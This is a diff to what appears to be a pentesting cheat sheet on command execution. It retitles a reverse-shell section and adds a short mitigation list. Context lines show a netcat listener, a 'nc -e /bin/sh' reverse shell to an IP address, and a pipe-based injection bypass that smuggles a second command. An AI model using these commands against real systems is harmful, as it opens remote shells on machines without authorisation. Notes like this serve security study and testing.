@@ -1,6 +1,6 @@
 # Code Execution
 
-## Get a reverse-shell
+## Exploit (Reverse-shell)
 ### Attacker Listening
 ```cmd
 nc -vv -l -p 8080
@@ -35,3 +35,7 @@ nc -e /bin/sh 10.20.14 8080
 ## Bypass
 - Use ```|``` between two code
   - ```10.20.14.208 | pwd```
+
+## Mitigation
+- Don't use dangerous funtions
+- Filter use input before execution
